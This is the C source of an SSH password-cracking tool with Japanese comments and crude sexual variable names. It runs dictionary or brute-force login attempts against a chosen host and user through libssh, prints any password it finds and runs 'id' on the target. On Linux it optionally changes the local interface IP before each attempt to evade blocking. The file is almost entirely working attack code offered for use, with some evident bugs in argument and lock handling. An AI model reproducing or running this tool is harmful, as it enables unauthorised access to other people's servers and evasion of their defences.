/*
 * このパスワード解析ツールはLinuxでもWindowsでも実行可能にしています。
 * これが俺の優しさだよ(´・ω・｀)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <libssh/libssh.h>
#if _WIN32
#define cls "cls"   /* Do windows stuff */
#elif __linux__
#include <time.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <error.h>
#define cls "clear" /* Do linux stuff */
#else
#define cls "clear" /* If you are not sure, make it a Linux command. */
#endif
#define MAXLEN 1024

pthread_mutex_t mutex;

//エロい構造(体)
struct hentai {
    char *hotel; //ip
    char *jk;    //name
    int vagina;  //port
    char av[256];//filename
    char ok[2]; //bool
} otintin;

//見たとおり。
void logo() {
    system(cls);
    printf("           _                           _ \n\
   ___ ___| |__     ___ _ __ __ _  ___| | _____ _ __\n\
  / __/ __| '_ \\   / __| '__/ _` |/ __| |/ / _ \\ '__|\n\
  \\__ \\__ \\ | | | | (__| | | (_| | (__|   <  __/ |\n\
  |___/___/_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|\n");
    puts("");
    printf("          ---==[ creator: ware255 ]==---  \n");
}

#if __linux__
unsigned int xor64(unsigned long *w) {
    static unsigned long x;
    x = *w;
    x ^= (x << 7);
    return x ^= (x >> 9);
}

void fake_ip() {
    struct ifreq ifreq;
    struct sockaddr_in *sin;
    char buf[INET_ADDRSTRLEN];
    char ip[16];

    int soc = socket(PF_PACKET, SOCK_RAW, 0);
    if(soc < 0) {
        perror("[-]socket()");
        exit(1);
    }

    unsigned long w = (unsigned long)time(NULL);

    //IPアドレスの取得
    memset(&ifreq, 0, sizeof(struct ifreq));
    strncpy(ifreq.ifr_name, "eth1", sizeof(ifreq.ifr_name) - 1);
    if(ioctl(soc, SIOCGIFADDR, &ifreq) < 0){
        perror("[-]ioctl(SIOCGIFADDR)");
        close(soc);
        exit(1);
    }

    //IPアドレスを見やすいように表示する
    sin = (struct sockaddr_in *)&ifreq.ifr_addr;
    inet_ntop(AF_INET, &sin->sin_addr.s_addr, buf, sizeof(buf));

    //IPアドレスの書き換え
    sprintf(ip, "192.168.24.%d", xor64(&w) % 255);
    sin->sin_addr.s_addr = inet_addr(ip);
    if (ioctl(soc, SIOCSIFADDR, &ifreq) < 0) {
        perror("[-]ioctl(SIOCSIFADDR)");
        close(soc);
        exit(1);
    }

    sprintf(ip, "192.168.25.%d", xor64(&w) % 255);
    sin = (struct sockaddr_in *)&ifreq.ifr_broadaddr;
    sin->sin_addr.s_addr = inet_addr(ip);
    if (ioctl(soc, SIOCSIFBRDADDR, &ifreq) < 0) {
        perror("[-]ioctl(SIOCSIFBRDADDR)");
        close(soc);
        exit(1);
    }

    sprintf(ip, "255.255.%d.%d", xor64(&w) % 255, xor64(&w) % 255);
    sin = (struct sockaddr_in *)&ifreq.ifr_netmask;
    sin->sin_addr.s_addr = inet_addr(ip);
    if (ioctl(soc, SIOCSIFNETMASK, &ifreq) < 0) {
        perror("[-]iocrl(SIOCSIFNETMASK)");
        close(soc);
        exit(1);
    }

    close(soc);
    return;
}
#endif

//コマンドを一回だけ実行させる
int show_remote_processes(ssh_session session) {
    ssh_channel channel;
    int nbytes, rc;
    char buffer[256];
    
    if ((channel = ssh_channel_new(session)) == NULL) return SSH_ERROR;
    
    if ((rc = ssh_channel_open_session(channel)) != SSH_OK) {
        ssh_channel_free(channel);
        return rc;
    }
    
    if ((rc = ssh_channel_request_exec(channel, "id")) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return rc;
    }
    
    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
        if (write(1, buffer, nbytes) != (unsigned int) nbytes) {
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            return SSH_ERROR;
        }
        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
    }
    
    if (nbytes < 0) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return SSH_ERROR;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return SSH_OK;
}

//ssh接続
int ssh_main_connection(char password[]) {
    char key[strlen(password) + 1];
    int rc;
    size_t i;
    ssh_session my_ssh_session = ssh_new();
    
    if (my_ssh_session == NULL) return 1;

    for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
    
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, otintin.hotel);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, otintin.jk);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &otintin.vagina);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");
    
    if ((rc = ssh_connect(my_ssh_session)) != SSH_OK) {
        fprintf(stderr, "Error: %s\n", ssh_get_error(my_ssh_session));
        ssh_free(my_ssh_session);
        return 1;
    }
    
    if ((rc = ssh_userauth_password(my_ssh_session, NULL, key)) != SSH_AUTH_SUCCESS) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return 1;
    }
    else {
        printf("\nPassword found! => %s\n", key);
    }
    
    if ((rc = show_remote_processes(my_ssh_session)) != SSH_OK) {
        printf("Error: Could not execute the command.\n");
        ssh_free(my_ssh_session);
        return 1;
    }
    
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return 0;
}

//辞書攻撃
void *dictionary_attack(void *p) {
    int (*p_func)(char*) = &ssh_main_connection;
    char str[MAXLEN] = {0};
    int logical = -1;
    FILE *fp;
    if ((fp = fopen(otintin.av, "r")) == NULL) {
        printf("Error: Could not open file.\n");
        exit(1);
    }
    while (fgets(str, MAXLEN, fp) != NULL) {
        str[strcspn(str, "\n")] = 0;
        pthread_mutex_lock(&mutex);
#if __linux__
        if (otintin.ok[0] == 'y') fake_ip();
        pthread_mutex_unlock(&mutex);
#endif
        if ((*p_func)(str) == 0) {
            logical = 1;
            pthread_mutex_unlock(&mutex);
            break;
        }
        pthread_mutex_unlock(&mutex);
    }
    if (logical != 1) {
        printf("\nPassword not found :(\n");
    }
    fclose(fp);
    return NULL;
}

//総当たり攻撃
void *brute_force_attack(void *p) {
    int (*p_func)(char*) = &ssh_main_connection;
    const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
    char str[MAXLEN + 1] = {0};
    int index[MAXLEN + 1] = {0};
    int i, carry;
    do {
#if __linux__
        pthread_mutex_lock(&mutex);
        if (otintin.ok[0] == 'y') {
            fake_ip();
        }
        pthread_mutex_unlock(&mutex);
#endif
        if ((*p_func)(str) == 0) {
            break;
        }
        for(i = 0, index[i]++, carry = !0; carry; i++) {
            pthread_mutex_lock(&mutex);
            carry = index[i] >= strlen(x);
            if (carry) {
                index[i+1]++;
                index[i] = 1;
            }
            str[i] = x[index[i]];
            pthread_mutex_unlock(&mutex);
        }
    } while(index[MAXLEN] == 0);
    return NULL;
}

void hello_world(int n) {
    pthread_t p1;
    pthread_mutex_init(&mutex, NULL);

    if (n == 1) { //辞書攻撃
        logo();
        printf("\nEnter a file name.\n: ");
        fgets(otintin.av, sizeof(otintin.av), stdin);
        otintin.av[strcspn(otintin.av, "\n")] = 0;
#if __linux__
        logo();
        printf("\nDo you want the IP address to change every time?[y/n]\n: ");
        fgets(otintin.ok, sizeof(otintin.ok), stdin);
        otintin.ok[strcspn(otintin.ok, "\n")] = 0;
#endif
        printf("\nAnalyzing %s password...\n", otintin.hotel);
        pthread_create(&p1, NULL, &dictionary_attack, NULL);
        pthread_join(p1, NULL);
    }
    else { //Other
#if __linux__
        logo();
        printf("\nDo you want the IP address to change every time?[y/n]\n: ");
        fgets(otintin.ok, sizeof(otintin.ok), stdin);
        otintin.ok[strcspn(otintin.ok, "\n")] = 0;
#endif
        printf("\nAnalyzing %s password...\n", otintin.hotel);
        pthread_create(&p1, NULL, &brute_force_attack, NULL);
        pthread_join(p1, NULL);
    }

    pthread_mutex_destroy(&mutex);

    return;
}

int main(int argc, char* argv[]) {
    char c_mode[4];
    int port = 22, mode = 2;
    
    if (argc < 6) {
        printf("\nHow to use: %s -h <IP> -p <Port> -u <user_name>\n\n", argv[0]);
        return 1;
    }
    
    otintin.vagina = atoi(argv[4]);
    if (port < 0 || port > 65535) {
        printf("Error: Do you know what a short type is?\n");
        return 1;
    }
    
    logo();
    
    otintin.hotel = argv[2];
    otintin.jk = argv[6];
    
    puts("\n 1: brute force attack");
    puts(" 2: dictionary attack");
    printf("[*] Select Mode [1/2]: ");
    fgets(c_mode, sizeof(c_mode), stdin);
    if (c_mode[0] == '\n') {
        hello_world(1);
    }
    mode = atoi(c_mode);
    switch (mode) {
    case 1:
        hello_world(0);
        break;
    case 2:
        hello_world(1);
        break;
    default:
        printf("Error: Do you know what an integer is?\n");
        return 1;
        break;
    }
    
    return 0;
}
